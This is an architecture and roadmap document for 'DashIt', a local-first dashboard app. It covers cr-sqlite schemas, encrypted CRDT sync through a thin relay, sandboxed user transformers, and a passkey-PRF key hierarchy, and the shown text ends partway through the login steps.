# DashIt — Local-First Architecture & Phased Roadmap

**Revision 3.** Revision 1 was reviewed and found to have two security-relevant flaws (recovery key sent to the server in plaintext; a bypassable transformer sandbox) and several "additive migration" claims that were not additive (a non-CRR-compatible schema, a WASM-binary swap disguised as a feature flag, no schema-evolution story, no service worker for the offline shell). Revision 2 fixed those. Revision 3 resolves every remaining open question (§11 is now a decision log), merges `checklist_items` into `task_items`, and tightens the sandbox CSP. Changes are summarized in §12.

## Context

`dashit` is a Bun workspace with three packages: `app` (SvelteKit 2 / Svelte 5, Tailwind v4, shadcn-svelte initialized but no components added), `backend` (bare Bun), `shared` (placeholder). No git history, database, auth, or product code exists yet.

The product is a **local-first dashboard**: users compose a dashboard from elements (editables: task, checklist, table; observables: chart, aggregation) fed by datasources (external HTTP/WebSocket, internal editables, static values) through optional user-written transformers. All application data lives in a SQLite database on each device. The Bun server is a **thin relay and auth service** that stores only ciphertext and WebAuthn public keys; it never sees plaintext content, datasource payloads, or API keys. Devices sync via encrypted CRDT changesets. An optional AI feature suggests transformer code using the user's own LLM key, which never leaves the device except to the LLM provider.

---

## 0. Key Decisions At a Glance

| Decision | Choice | Why |
|---|---|---|
| Runtime topology | Browser PWA: cr-sqlite WASM + persistent VFS in a dedicated Worker, app shell precached by a service worker | Zero install; storage behind a `LocalStore` seam so a Tauri shell is a later driver swap |
| SQLite build | **`@vlcn.io/crsqlite-wasm` from Phase 1** (not the official sqlite-wasm) | cr-sqlite must be compiled into the WASM binary; switching builds later is a driver swap, not a flag. Confirmed: commit to cr-sqlite, gated by a Phase 0 spike |
| Sync/merge engine | **cr-sqlite** per-column LWW CRDT tables | Changeset feed, merge, and causal versioning without a hand-rolled algorithm |
| Schema discipline | **CRR-compatible from day one**: PK on every table, no `NOT NULL` without `DEFAULT`, no FK/CHECK/secondary-UNIQUE constraints | These break cr-sqlite merges; validation lives in the app layer |
| Server framework | **Hono on Bun**, `bun:sqlite` for relay metadata + envelope blobs | Thin, typed, first-class Bun support |
| Transformer sandbox | **Sandboxed iframe (opaque origin, CSP `connect-src 'none'`) hosting a Worker**; user code via `new Function` | Blocks network by policy, not convention; Worker gives `terminate()`-based timeouts |
| Grid | Custom CSS Grid + Pointer Events, **shove-down collision** (confirmed) | Full control over the placement/hide/resize lifecycle; predictable, no overlap |
| Hidden vs. Unplaced UI | One unified off-canvas panel with an Unplaced / Hidden filter | Same concept (no visible placement); one drag source |
| Lazy activation | Hidden elements are **inactive** | Hiding is a "don't need this now" signal, same as unplacing |
| Anonymous mode | **Permanent product option** (confirmed): fully usable without an account | Local-first ethos; account is offered for sync/backup, never required |
| Eviction warning | Dismissible banner in Settings/sync status + a dashboard toast when local-only data is >24 h old (confirmed) | Informative without a sign-up wall |
| Ordering | String-based fractional indexing (`sort_key TEXT`) | REAL midpoints exhaust precision; rebalancing under CRDT is itself a conflict |
| Task/checklist model | **One `task_items` table** for both kinds (confirmed) | A checklist item is a root task item; nesting gives it sub-tasks; one table and cascade fewer |
| Table cells | Own `table_cells` table (per-cell LWW) rather than a JSON blob per row | Concurrent edits to different cells of one row must both survive |
| Transformer versions | **Code only** is versioned (confirmed); inputs live on `edges` | Reproducing old runs is not a goal; rollback keeps current inputs |
| DEK lifetime | **Created with the account** (confirmed); anonymous users have no DEK | Keeps Phase 1–2 crypto-free; consequence: anonymous local secrets are unencrypted at rest (§4.9) |
| Recovery key | 128-bit, **26-char Crockford base32** (confirmed); split via HKDF into an **auth verifier** (sent) and a **wrap key** (never sent); recovery login **also requires an email code** (confirmed) | Server must never be able to unwrap the DEK; a leaked key sheet alone is insufficient |
| Re-unlock UX | DEK cached under a non-extractable device `CryptoKey` in IndexedDB (opt-out in Settings) | Passkey ceremony only on new devices or explicit lock |
| Account deletion | Revoke sessions/credentials immediately; purge relay data after **7 days** (confirmed) | Undo window for accidental deletion; devices offer to wipe on next sync |
| Tombstone GC | Local hard-delete after **90 days** (confirmed) | Far beyond the 7-day envelope retention |
| Rate limits | Proposed numbers **accepted as initial config** (confirmed, §9) | Tunable via environment |
| CORS proxy | **Deferred to Phase 5+** (confirmed) | Only route where the server sees plaintext in transit |
| Multi-tab | **Deferred to Phase 5+** (confirmed); single active tab + warning | SharedWorker arbitration is hardening, not core |
| Apple/iCloud PRF | **Silent per-credential fallback** (confirmed) | Feature-detect; no platform-specific steering UI |

---

## 1. Runtime Topology

### 1.1 Options

- **A. Browser PWA (chosen).** SQLite WASM persisted in the origin's storage, all DB work in a dedicated Worker, app shell precached by a service worker so the URL loads offline. Zero install. Costs: single-writer-per-tab (multi-tab deferred), storage is evictable under pressure even after `navigator.storage.persist()`, browser support matrix must be checked (OPFS sync access handles: Chrome 102+, Safari 17+, Firefox 111+).
- **B. Installed local Bun process.** Real `bun:sqlite`, but an install/updater story that breaks the "open a URL" pitch, and duplicates A's sync/crypto code on a different driver. **Not recommended at any phase.**
- **C. Tauri shell.** Native SQLite + filesystem + same SvelteKit UI, at the cost of a second build/release pipeline. **Phase 5+ fallback**, reachable by swapping the `LocalStore` driver.

### 1.2 Concrete browser setup

- **SQLite build:** `@vlcn.io/crsqlite-wasm` (wa-sqlite with cr-sqlite compiled in). The official `@sqlite.org/sqlite-wasm` cannot load cr-sqlite as a runtime extension, so this choice is made in Phase 1, not Phase 3.
- **VFS (decided by the Phase 0 spike, §1.4):** `AccessHandlePoolVFS` from `@vlcn.io/wa-sqlite` (OPFS sync access handles, no COOP/COEP, single connection) when a real access handle can be opened; otherwise the package's default `IDBBatchAtomicVFS` (IndexedDB). Detection is a live probe (`opfsAvailable()`), not feature sniffing — WebKit exposes the API but throws `UnknownError` in ephemeral sessions. Rollback journal in `DELETE` mode; WAL is unavailable (no shared memory, fails to reopen). Every connection sets `PRAGMA temp_store = MEMORY` and `cache_size = -16000`. Database names are restricted to `[A-Za-z0-9_.-]` (the pool VFS stores names in a fixed header and choked on `=`/`,`). The pool has a fixed file capacity; `openStore` grows it when fewer than four slots remain.
- **Worker layout:** one dedicated `db.worker.ts` owns the SQLite connection, the sync engine, and key material; the main thread talks to it over a typed `postMessage` RPC. The main thread never holds raw key bytes (it does hold non-extractable derived `CryptoKey`s for datasource-credential decryption, see §4.6).
- **SvelteKit mode:** `export const ssr = false` at the root layout, `@sveltejs/adapter-static` with SPA fallback (`fallback: 'index.html'`). Pages depend on a client-only database; SSR has nothing to render.
- **Service worker / PWA:** precache the built shell (HTML, JS, CSS, WASM, fonts); network-first for `/api/*`; web manifest for installability. Without this, "fully functional offline" is false.
- **Serving:** the Hono relay serves the static build under `/` and the API under `/api/v1` (one origin, no CORS for own API, simple deploy). A CDN in front is a later optimization.

### 1.3 Cross-topology invariants

The sync wire format (§3), the key-wrapping scheme (§4), and the `LocalStore` interface (§2.5) are topology-agnostic. A Tauri build runs the same Worker code inside the webview, or moves the driver to the Rust side behind the same RPC.

### 1.4 Phase 0 spike results (2026-09-22) — GO

Run via `packages/app/e2e/spike.pw.ts` against `/spike` (Playwright: Chromium 153, Firefox 155, WebKit 26.6 in the Playwright Docker image). Each run migrates the full §2 schema with `crsql_as_crr`, inserts 10k `table_cells` rows in one transaction, reloads and verifies persistence, merges changesets between two in-memory instances, and probes every network channel from inside sandboxed user code.

| Check | Chromium | Firefox | WebKit |
|---|---|---|---|
| OPFS AccessHandlePool persists across reload | yes | yes | n/a — OPFS throws in Playwright's ephemeral context; real Safari 17+ supports it |
| IndexedDB VFS persists across reload | yes | yes | yes |
| 10k-row insert, OPFS (dev / prod build) | 1.7–2.7 s / 0.42 s | 2.3 s / — | — |
| 10k-row insert, IDB (dev / prod build) | 1.4 s / 0.31 s | 1.1 s | 2.1 s |
| cr-sqlite merge: initial sync + concurrent edits to different columns of one row | converged | converged | converged |
| Sandbox: `fetch`, XHR, WebSocket, `import()`, EventSource, nested-worker `fetch` | all blocked | all blocked | all blocked |
| Sandbox: `RTCPeerConnection` in worker | undefined | undefined | undefined |
| Sandbox: timeout kill, thrown error surfaced, cyclic output rejected | yes | yes | yes |
| COOP/COEP headers required | no | no | no |

Findings that changed the design:

- **`PRAGMA temp_store = MEMORY` is mandatory.** With the default, statement journals for multi-row inserts with cr-sqlite triggers go through the VFS as temp files: 87,001 `xWrite` calls and 40–50 s for the 10k insert, versus 779 calls and ~1.7 s with it. It also removed a 10–20 s read stall on the IDB VFS. `cache_size` alone made no difference.
- **`crsql_as_crr` (and `crsql_begin/commit_alter`) fail inside an open transaction** in this WASM build ("no such savepoint"). `migrate()` runs them after the migration transaction commits.
- **cr-sqlite requires PK columns to be explicitly `NOT NULL`** ("CRRs must have a non nullable primary key"). Added to the CRR rules and to the unit test that checks them.
- **WAL + `locking_mode=EXCLUSIVE`** writes fast (1 `xSync`) but the database fails to reopen after reload; not usable on this VFS.
- **`@vlcn.io/crsqlite-wasm` 0.16.0 (Dec 2023, wa-sqlite 0.22)** is the last published browser build. Its `SQLite3.open()` only knows the IDB VFS; `openStore` registers the OPFS VFS itself through the exported API object. The `execO` helper returns `null` (not `[]`) for row-less statements; the driver normalizes. Its bundled AHP worker wrapper is an unfinished stub and is not used.
- **The `webrtc` CSP directive is unrecognized by Chromium and WebKit** (Firefox honours it). Irrelevant in practice because user code runs only in a Worker, where `RTCPeerConnection` does not exist; the probe asserts that.
- **Storage eviction in Playwright/WebKit** is a reminder that `opfsAvailable()` must be a live probe and IDB must remain a first-class fallback, not a dev convenience.

---

## 2. Local Data Model / SQLite Schema

### 2.1 CRR compatibility rules (apply to every synced table)

cr-sqlite converts a table to a conflict-free replicated relation with `SELECT crsql_as_crr('t')`. Changes are tracked and merged **per column**, so a row may be materialized on a peer with only some columns present. The schema therefore obeys:

1. Every table has an explicit `PRIMARY KEY` whose columns are declared `NOT NULL` (cr-sqlite rejects nullable PKs; SQLite otherwise allows NULL in non-INTEGER PKs). No `rowid` tables.
2. Every non-PK column is nullable or has a `DEFAULT`.
3. No `FOREIGN KEY` constraints. References are documented in comments and enforced by the app layer; parents may arrive after children.
4. No `CHECK` constraints and no secondary `UNIQUE` indexes (a merge must never fail on a constraint). Enum values are validated in the app layer. Non-unique indexes are fine.
5. Deletion is a soft-delete (`deleted_at`) so "undo" and cascades are ordinary column writes.

These rules are enforced by `packages/shared/test/migrate.test.ts` against every synced table and were verified against cr-sqlite 0.16.0 in the Phase 0 spike (§1.4). `crsql_as_crr` and the alter helpers must be called outside an open transaction.

### 2.2 Conventions

- IDs are UUIDv7 as `TEXT` (time-sortable, collision-free across offline devices).
- Timestamps are unix milliseconds (`INTEGER`), wall-clock, for display and app-level tie-breaking only. Causality is cr-sqlite's job.
- `sort_key TEXT` uses string fractional indexing (base-62 keys with the `fractional-indexing` algorithm): unbounded insertions between any two keys, no rebalancing, stable under concurrent inserts.
- Enum-like columns list their values in a comment; `packages/shared` exports the TypeScript unions.

### 2.3 Synced tables

```sql
CREATE TABLE dashboards (
  id          TEXT PRIMARY KEY NOT NULL,
  name        TEXT    NOT NULL DEFAULT 'Dashboard',
  grid_cols   INTEGER NOT NULL DEFAULT 12,
  created_at  INTEGER NOT NULL DEFAULT 0,
  updated_at  INTEGER NOT NULL DEFAULT 0,
  deleted_at  INTEGER
);

-- One row per element regardless of kind. Category (editable/observable) is derived from kind.
CREATE TABLE elements (
  id          TEXT PRIMARY KEY NOT NULL,
  kind        TEXT    NOT NULL DEFAULT '',   -- task | checklist | table | chart | aggregation
  title       TEXT    NOT NULL DEFAULT '',
  config_json TEXT    NOT NULL DEFAULT '{}', -- kind-specific: chart type/axes, aggregation fn/expression, etc.
  created_at  INTEGER NOT NULL DEFAULT 0,
  updated_at  INTEGER NOT NULL DEFAULT 0,
  deleted_at  INTEGER
);

-- 1:1 with elements. Row present & not deleted = placed. hidden=1 = placed but hidden.
-- Unplacing = set deleted_at; re-placing = clear deleted_at and write new coordinates.
-- element_id as PK removes the need for a unique index (which would break merges).
CREATE TABLE placements (
  element_id   TEXT PRIMARY KEY NOT NULL,    -- -> elements.id
  dashboard_id TEXT    NOT NULL DEFAULT '',  -- -> dashboards.id
  x            INTEGER NOT NULL DEFAULT 0,
  y            INTEGER NOT NULL DEFAULT 0,
  w            INTEGER NOT NULL DEFAULT 4,
  h            INTEGER NOT NULL DEFAULT 3,
  hidden       INTEGER NOT NULL DEFAULT 0,
  updated_at   INTEGER NOT NULL DEFAULT 0,
  deleted_at   INTEGER
);
CREATE INDEX idx_placements_dashboard ON placements(dashboard_id);

-- Editable payloads --------------------------------------------------------

-- Shared by task and checklist elements. A checklist item is a root task item; a checklist
-- "contains tasks" by nesting children under an item (spec). elements.kind decides rendering
-- (tree for task, flat list with optional expansion for checklist).
CREATE TABLE task_items (
  id          TEXT PRIMARY KEY NOT NULL,
  element_id  TEXT    NOT NULL DEFAULT '',   -- -> elements.id (kind=task | checklist)
  parent_id   TEXT,                          -- -> task_items.id, NULL = root
  title       TEXT    NOT NULL DEFAULT '',
  done        INTEGER NOT NULL DEFAULT 0,
  sort_key    TEXT    NOT NULL DEFAULT 'a0',
  created_at  INTEGER NOT NULL DEFAULT 0,
  updated_at  INTEGER NOT NULL DEFAULT 0,
  deleted_at  INTEGER
);
CREATE INDEX idx_task_items_element ON task_items(element_id);

CREATE TABLE table_columns (
  id          TEXT PRIMARY KEY NOT NULL,
  element_id  TEXT    NOT NULL DEFAULT '',   -- -> elements.id (kind=table)
  name        TEXT    NOT NULL DEFAULT '',
  data_type   TEXT    NOT NULL DEFAULT 'string', -- string | number | date | boolean
  sort_key    TEXT    NOT NULL DEFAULT 'a0',
  deleted_at  INTEGER
);
CREATE INDEX idx_table_columns_element ON table_columns(element_id);

CREATE TABLE table_rows (
  id          TEXT PRIMARY KEY NOT NULL,
  element_id  TEXT    NOT NULL DEFAULT '',   -- -> elements.id (kind=table)
  sort_key    TEXT    NOT NULL DEFAULT 'a0',
  created_at  INTEGER NOT NULL DEFAULT 0,
  deleted_at  INTEGER
);
CREATE INDEX idx_table_rows_element ON table_rows(element_id);

-- Per-cell rows so concurrent edits to different cells of one row both survive.
-- No deleted_at: a cell is removed by tombstoning its row or column; orphans are GC'd (§3.7).
CREATE TABLE table_cells (
  row_id      TEXT NOT NULL,                 -- -> table_rows.id
  column_id   TEXT NOT NULL,                 -- -> table_columns.id
  value_json  TEXT,                          -- JSON scalar typed per column; NULL = empty
  updated_at  INTEGER NOT NULL DEFAULT 0,
  PRIMARY KEY (row_id, column_id)
);

-- Datasources ---------------------------------------------------------------

CREATE TABLE datasources (
  id                 TEXT PRIMARY KEY NOT NULL,
  name               TEXT    NOT NULL DEFAULT '',
  kind               TEXT    NOT NULL DEFAULT 'static',  -- external | internal | static
  -- external
  fetch_mode         TEXT,                     -- poll | websocket
  url                TEXT,
  method             TEXT,                     -- GET | POST ...
  poll_interval_ms   INTEGER,
  response_path      TEXT,                     -- JSON pointer into the response body, optional
  secrets_ciphertext BLOB,                     -- AES-GCM({headers, query}) under K_ds (§4.1). Anonymous users (no DEK) store plaintext JSON here; encrypted on account creation (§4.9).
  -- internal
  source_element_id  TEXT,                     -- -> elements.id (an editable)
  -- static
  static_value_json  TEXT,
  created_at         INTEGER NOT NULL DEFAULT 0,
  updated_at         INTEGER NOT NULL DEFAULT 0,
  deleted_at         INTEGER
);

-- Transformers ---------------------------------------------------------------

CREATE TABLE transformers (
  id                  TEXT PRIMARY KEY NOT NULL,
  name                TEXT    NOT NULL DEFAULT '',
  current_version_id  TEXT,                    -- -> transformer_versions.id
  timeout_ms          INTEGER NOT NULL DEFAULT 2000,
  created_at          INTEGER NOT NULL DEFAULT 0,
  updated_at          INTEGER NOT NULL DEFAULT 0,
  deleted_at          INTEGER
);

-- Append-only; only transformers.current_version_id is ever updated.
CREATE TABLE transformer_versions (
  id               TEXT PRIMARY KEY NOT NULL,
  transformer_id   TEXT    NOT NULL DEFAULT '', -- -> transformers.id
  code             TEXT    NOT NULL DEFAULT '',
  note             TEXT,                        -- 'manual edit' | 'AI suggestion (reviewed)' | ...
  created_by_site  TEXT    NOT NULL DEFAULT '',
  created_at       INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX idx_transformer_versions_t ON transformer_versions(transformer_id, created_at);

-- Dependency graph edges. One representation for both "observable consumes X" and
-- "transformer takes X as input #n", so reverse lookups (who depends on this datasource?)
-- are a single indexed query. Transformer inputs are not versioned with the code (confirmed):
-- rolling back to an older version keeps the current inputs.
CREATE TABLE edges (
  id             TEXT PRIMARY KEY NOT NULL,
  consumer_kind  TEXT    NOT NULL DEFAULT '',  -- element | transformer
  consumer_id    TEXT    NOT NULL DEFAULT '',
  producer_kind  TEXT    NOT NULL DEFAULT '',  -- datasource | transformer
  producer_id    TEXT    NOT NULL DEFAULT '',
  position       INTEGER NOT NULL DEFAULT 0,   -- argument order for transformer inputs
  config_json    TEXT    NOT NULL DEFAULT '{}',-- element bindings: field mapping (x/y keys, agg column, ...)
  created_at     INTEGER NOT NULL DEFAULT 0,
  deleted_at     INTEGER
);
CREATE INDEX idx_edges_producer ON edges(producer_kind, producer_id);
CREATE INDEX idx_edges_consumer ON edges(consumer_kind, consumer_id);
```

CRR registration (run after DDL, idempotent, from Phase 1 even though the relay doesn't exist yet):

```sql
SELECT crsql_as_crr('dashboards');        SELECT crsql_as_crr('elements');
SELECT crsql_as_crr('placements');        SELECT crsql_as_crr('task_items');
SELECT crsql_as_crr('table_columns');     SELECT crsql_as_crr('table_rows');
SELECT crsql_as_crr('table_cells');       SELECT crsql_as_crr('datasources');
SELECT crsql_as_crr('transformers');      SELECT crsql_as_crr('transformer_versions');
SELECT crsql_as_crr('edges');
```

### 2.4 Local-only tables (never `crsql_as_crr`, never in a changeset)

```sql
-- schema_version, site_id, account_id, device_label, last_export_at, ...
CREATE TABLE local_meta (
  key    TEXT PRIMARY KEY NOT NULL,
  value  TEXT
);

-- Last-known value per datasource so the dashboard renders offline with stale data.
-- Local-only: syncing external payloads would be pure churn and leak nothing useful.
CREATE TABLE datasource_cache (
  datasource_id  TEXT PRIMARY KEY NOT NULL,
  value_json     TEXT,
  fetched_at     INTEGER,
  error          TEXT
);

-- Device-local secrets (LLM API key). Encrypted under K_local (§4.6). Excluded from sync structurally.
CREATE TABLE local_secrets (
  key               TEXT PRIMARY KEY NOT NULL,   -- 'llm_api_key', 'llm_provider'
  value_ciphertext  BLOB NOT NULL,
  updated_at        INTEGER NOT NULL
);

CREATE TABLE sync_state (
  id                  INTEGER PRIMARY KEY CHECK (id = 1),
  last_pushed_db_version INTEGER NOT NULL DEFAULT 0,  -- cr-sqlite db_version watermark (this site)
  last_pulled_seq     INTEGER NOT NULL DEFAULT 0,     -- relay-assigned sequence (per account)
  last_snapshot_seq   INTEGER NOT NULL DEFAULT 0,
  last_sync_ok_at     INTEGER,
  last_sync_error     TEXT
);

-- Local AI egress log for the user's own auditing (Phase 4). Never synced.
CREATE TABLE ai_egress_log (
  id             TEXT PRIMARY KEY NOT NULL,
  at             INTEGER NOT NULL,
  provider       TEXT NOT NULL,
  transformer_id TEXT,
  sample_bytes   INTEGER NOT NULL
);
```

The relay is the source of truth for enrolled credentials and wrapped-DEK copies (`GET /keys`); there is no local mirror table.

### 2.5 Storage abstraction

```ts
// packages/shared/src/local-store.ts
export interface LocalStore {
  exec(sql: string, params?: SqlValue[]): Promise<void>;
  query<T>(sql: string, params?: SqlValue[]): Promise<T[]>;
  transaction<T>(fn: (tx: LocalStore) => Promise<T>): Promise<T>;
  /** cr-sqlite: rows from crsql_changes WHERE db_version > since AND site_id = local site. */
  changesSince(since: number): Promise<Changeset>;
  /** cr-sqlite: INSERT INTO crsql_changes ... ; idempotent and commutative. */
  applyChanges(cs: Changeset): Promise<void>;
  /** Full-state changeset (db_version > 0) for snapshots. */
  exportAll(): Promise<Changeset>;
  dbVersion(): Promise<number>;
  subscribe(tables: string[], cb: (tables: string[]) => void): Unsubscribe;
  close(): Promise<void>;  // calls crsql_finalize()
}
```

Implementations: `CrSqliteWasmStore` (Phase 1+, inside `db.worker.ts`), `NativeCrSqliteStore` (Tauri, Phase 5+). Everything above this interface — schema migrations, sync engine, crypto, dataflow, UI — is driver-agnostic.

### 2.6 Cascade and integrity rules (app layer)

Because FKs are not enforced, the app layer owns these, implemented as `LocalStore.transaction` helpers in `packages/shared`:

- Deleting an element tombstones its placement, its edges (both directions), and its kind-specific rows (`task_items`, `table_columns`/`table_rows`). `table_cells` are not touched; they become orphans and are GC'd.
- Deleting a datasource or transformer tombstones edges that reference it. Consumers show an "unbound" state rather than failing.
- Readers always filter `deleted_at IS NULL` and ignore rows whose parent is missing or deleted (a child may arrive before its parent during sync).
- Edge creation runs cycle detection over the live graph (§5.1) and rejects cycles.

---

## 3. Sync Protocol

### 3.1 Why cr-sqlite

- **SQLite session extension + custom merge:** gives capture/apply of changesets but no per-column merge, no causal ordering, and conflict callbacks you must implement. Reinvents cr-sqlite with more bug surface. Rejected.
- **Document CRDTs (Yjs/Automerge):** excellent for text, poor for relational data; you end up simulating tables inside a document. Rejected for the primary store; a possible future addition for rich-text fields only.
- **cr-sqlite (chosen):** per-column last-writer-wins CRDT tables with `crsql_changes` as the feed, `db_version` for causal versioning, WASM and native builds. **Known risk:** low-maintenance since 2024 (its author moved to Rocicorp). Mitigations: pin the version, keep `LocalStore` as the seam, and run the Phase 0 go/no-go spike before writing product code. Confirmed decision: commit, no separate bake-off.

### 3.2 Changeset serialization

A `Changeset` is the array of `crsql_changes` rows (`table, pk, cid, val, col_version, db_version, site_id, cl, seq`) encoded as CBOR (compact, binary-safe for BLOB values, no JSON number-precision issues). Chunked so one envelope stays under 1 MiB plaintext; a large local edit burst produces several envelopes.

### 3.3 Encryption envelope

```
SyncEnvelope v1 (binary, CBOR map)
  v               = 1
  schema_version  = integer (§3.6)
  site_id         = 16 bytes
  from, to        = db_version range covered (this site), to > from
  nonce           = 12 bytes, random
  ciphertext      = AES-256-GCM(cbor(changeset), key = K_sync_site, aad = AAD)

K_sync_site = HKDF-SHA256(ikm = DEK, salt = site_id, info = "dashit/sync/v1")
AAD         = fixed-width encoding of (v, schema_version, site_id, from, to)  -- not JSON
```

A per-site subkey bounds nonce reuse risk per key and lets the AAD authenticate the routing metadata the relay sees. The relay stores and forwards envelopes as opaque blobs plus the unencrypted header fields; it never has `DEK` or any subkey.

Field-level ciphertext (`datasources.secrets_ciphertext`, §4.6) travels inside the envelope, so credentials are double-wrapped in transit.

**What the relay can observe:** envelope sizes, timing, `site_id`s, and per-account activity patterns. It cannot see content. The privacy claim is "no plaintext content", not "no metadata".

### 3.4 Relay sequencing, push, pull

- The relay assigns a strictly increasing `seq` per account to each accepted envelope.
- **Push** (debounced ~500 ms after the last local write, plus on `online`/visibility events): `changesSince(last_pushed_db_version)` → chunk → encrypt → `POST /sync/push` → advance `last_pushed_db_version` per acknowledged envelope.
- **Pull**: `GET /sync/pull?since=<last_pulled_seq>&limit=100` → envelopes from other sites in `seq` order (this site's own envelopes are filtered server-side by `site_id`) → verify `schema_version` (§3.6) → decrypt → `applyChanges` in a transaction → advance `last_pulled_seq`. Cross-site application order does not matter (merge is commutative and idempotent); within-site order is guaranteed by `from/to` monotonicity.
- **Live nudge**: `GET /sync/subscribe` WebSocket; the relay sends `{ seq }` when a new envelope lands for the account. Payload-free. Clients pull on nudge; fall back to a 60 s poll when the socket is down.
- **Gap detection**: the pull response includes `oldest_retained_seq`. If `last_pulled_seq < oldest_retained_seq` (device offline past the retention window), the relay returns `410 Gone` and the client re-bootstraps from the snapshot (§3.5). Re-applying a snapshot over existing local state is safe by idempotence.

### 3.5 Snapshots and compaction

- A **snapshot** is `exportAll()` encrypted as a `SnapshotEnvelope` (same envelope shape, `from = 0`) tagged with `covers_seq` = the relay `seq` the producing device had fully pulled and applied before exporting.
- Any device may produce one when `seq - last_snapshot_seq > 500` or `now - last_snapshot_at > 7 days`, whichever first. Duplicate snapshots from two devices are harmless; the relay keeps the highest `covers_seq`.
- The relay prunes envelopes with `seq <= covers_seq` **after a 7-day grace period**, and never below the retention floor of the latest snapshot. Pruning keys on relay `seq`, not per-site `db_version` (which is not comparable across sites).
- **New-device onboarding**: unlock DEK (§4) → `GET /sync/snapshot` → apply → `GET /sync/pull?since=covers_seq` → apply tail → normal operation. Onboarding cost is snapshot + recent tail, not full history.

### 3.6 Schema evolution

Devices on different app versions will exchange changesets. Rules:

- `local_meta.schema_version` is an integer bumped by every migration; every envelope carries the producer's `schema_version`.
- **Newer clients accept older envelopes** (missing columns take defaults).
- **Older clients refuse newer envelopes**: stop pulling, show "update required", keep pushing (their changes are valid under the newer schema too). Never apply blind.
- Migrations are **additive only**: add tables, add nullable/defaulted columns. Renames and drops are done by adding a replacement and tombstoning the old name in code; physical drops only after a version floor is enforced server-side (`/account` reports `min_schema_version`; clients below it are told to update before syncing).
- Altering a CRR table uses cr-sqlite's protocol: `SELECT crsql_begin_alter('t'); ALTER TABLE t ADD COLUMN ...; SELECT crsql_commit_alter('t');`.
- Migrations run inside `db.worker.ts` on open, in a transaction, before the UI attaches.

### 3.7 Tombstone GC

Soft-deleted rows and orphaned `table_cells` accumulate. GC runs locally: rows with `deleted_at < now - 90 days` are hard-deleted, and orphaned cells whose row or column is hard-deleted go with them. Because cr-sqlite tracks a delete as a merged state, a peer that comes online after 90 days with a late edit to that row would resurrect it partially; the 90-day window is well beyond the 7-day envelope retention (a device that far behind re-bootstraps from a snapshot anyway, which contains no GC'd rows). Window is configurable; the trade-off is documented in §11.

### 3.8 Conflict semantics (what users will observe)

- Struct-like rows (element config, placement coordinates, datasource settings): per-column LWW — concurrent edits to different fields both survive; same-field races pick a winner by cr-sqlite's `(col_version, site_id)` tiebreak.
- Ordered lists: string fractional keys interleave concurrent inserts deterministically; no rebalancing.
- Table cells: per-cell LWW.
- Deletes: `deleted_at` is a column under LWW. Editing an item on device B after device A deleted it will resurrect it if B's write is later — an explicit design choice matching "edit wins over delete" intuition.
- Transformer code: append-only versions never conflict; `current_version_id` is LWW. Two devices editing the same transformer concurrently produce two versions, one of which is "current"; the other remains in history.

---

## 4. Auth, Keys, and Unlock

### 4.1 Key hierarchy

```
DEK (32 random bytes, generated once when the account is created; anonymous users have none, §4.9)
 ├─ K_sync_site  = HKDF(DEK, salt=site_id,  info="dashit/sync/v1")        AES-256-GCM, sync envelopes
 ├─ K_ds         = HKDF(DEK, salt=APP_SALT, info="dashit/ds-secrets/v1")  AES-256-GCM, datasources.secrets_ciphertext (same on all devices: the column syncs)
 └─ K_local      = HKDF(DEK, salt=site_id,  info="dashit/local/v1")       AES-256-GCM, local_secrets

Wrapped copies of DEK stored on the relay (ciphertext only), one per unlock method:
  passkey_prf   : AES-256-GCM(DEK, key = HKDF(prf_output, salt=APP_PRF_SALT, info="dashit/dek-wrap/v1"), aad = account_id || credential_id)
  recovery_key  : AES-256-GCM(DEK, key = K_rk_wrap, aad = account_id || "recovery")
```

Wrapping uses AES-GCM (not AES-KW) so the AAD binds each copy to its account and credential.

**In-memory handling:** raw DEK bytes exist only inside `db.worker.ts`, only during unlock and enrollment ceremonies. Immediately after unwrap the DEK is imported as a non-extractable `HKDF` `CryptoKey`; subkeys are derived with `deriveKey` as non-extractable `AES-GCM` keys; the raw buffer is zeroed. Enrollment of a new credential needs raw DEK bytes again, so it is performed by unwrapping from the device cache (§4.5) or by a fresh PRF unlock — never by extracting a live key.

`APP_PRF_SALT` is a fixed 32-byte application constant. PRF output is already unique per credential; a per-device salt adds nothing and would create a bootstrapping problem (the salt is needed *inside* the assertion that unlocks the account).

### 4.2 Wrapping is per credential, not per device

A synced passkey (iCloud Keychain, Google Password Manager) is one credential present on many devices; its PRF output is identical everywhere, so one wrapped copy unlocks all of them. A device-bound passkey (security key, Windows Hello without sync) is one credential on one device. The relay stores one wrapped copy per **credential**. "Adding a device" means either using an existing synced credential on it, or enrolling a new credential from it after unlocking by another method.

### 4.3 Registration (first device)

1. `POST /auth/register { email }` → the server always responds identically (no account-existence leak) and emails a 6-digit code (15 min, 5 attempts).
2. `POST /auth/verify { email, code }` → `reg_token` (15 min, single use).
3. Client generates DEK, `account_id` (from the server response), and `site_id`.
4. `navigator.credentials.create()` with `residentKey: "required"`, `userVerification: "required"`, `attestation: "none"` (the relay verifies the registration response but never attestation chains), `extensions: { prf: { eval: { first: APP_PRF_SALT } } }`.
   - If `getClientExtensionResults().prf.results.first` is present, use it.
   - If `prf.enabled === true` but no results (common on Android and some passkey providers), perform one follow-up `navigator.credentials.get()` with `allowCredentials: [newCredentialId]` and the same `prf.eval` to obtain the output. This is the only place the two-step flow is needed.
   - If `prf.enabled` is false/absent, this credential cannot unlock data; the account proceeds with recovery-key-only unlock for it (silent fallback, confirmed decision), flagged in Settings.
5. Derive the wrap key, wrap DEK. `POST /keys { reg_token, credential: <attestation>, wrap_method: 'passkey_prf', wrapped_dek }` → the server verifies attestation, creates the account, stores the credential public key and the wrapped copy atomically, returns session tokens.
6. **Recovery key**, mandatory at registration: `rk` = 128 random bits, displayed once as 26 Crockford-base32 characters in groups of 4 (confirmed format; unambiguous glyphs, copy-paste friendly, no wordlist). Derive `verifier = HKDF(rk, info="dashit/recovery/auth/v1")` and `K_rk_wrap = HKDF(rk, info="dashit/recovery/wrap/v1")`. `PUT /keys/recovery { verifier_hash: SHA-256(verifier), wrapped_dek }`. The server never receives `rk` or `K_rk_wrap`. Argon2 is unnecessary: `rk` has 128 bits of entropy.
7. Client stores `account_id`, `site_id`, `schema_version` in `local_meta` and writes the device cache (§4.5).

### 4.4 Login / unlock

**Passkey (single ceremony, no second prompt):**
1. `POST /auth/challenge` → `{ challenge }`. No email required: credentials are discoverable; conditional UI (autofill) is used where available.
2. `navigator.credentials.get()` with `userVerification: "required"` and `extensions: { prf: { eval: { first: APP_PRF_SALT } } }`.
